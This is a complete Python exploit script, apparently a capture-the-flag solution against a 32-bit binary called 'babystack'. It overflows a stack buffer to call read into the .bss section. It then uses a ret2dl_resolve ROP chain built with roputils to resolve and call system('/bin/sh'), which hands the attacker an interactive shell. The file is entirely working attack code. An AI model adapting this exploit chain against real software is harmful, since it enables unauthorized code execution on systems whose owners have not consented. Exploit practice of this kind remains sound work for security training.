#!/usr/bin/env python2
from mypwn import *
import roputils

def pwn(ip=None,port=None):

    binary='babystack'
    io,libc,ru,rn,sl,sn=init(binary)
    context.arch = 'i386'
    context.log_level='debug'


    elf = ELF(binary)
    #p=cyclic(0x40)
    #sn(p)
    eip='laaa'

    offset = cyclic_find(eip) #cyclic_find('baaacaaa', n=8)
    info('offset',offset)

    #ret2elf
    leave_ret=0x8048455
    bof=0x0804843b
    arg_addr=elf.bss()
    func_addr=arg_addr+20

    p1='a'*offset+p32(elf.symbols['read'])+p32(bof)+p32(0)+p32(arg_addr)+p32(100)
    info('p1 len',len(p1))
    assert len(p1)==0x40

    sn(p1)

    # ret2dl
    # save data to bss

    rop = roputils.ROP(binary)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    buf += rop.dl_resolve_data(func_addr, 'system')
    buf += rop.fill(100, buf)
    sn(buf)

    # call
    p2='a'*offset+ rop.dl_resolve_call(func_addr, arg_addr)
    sn(p2)
    io.interactive()

if __name__=="__main__":
    pwn()

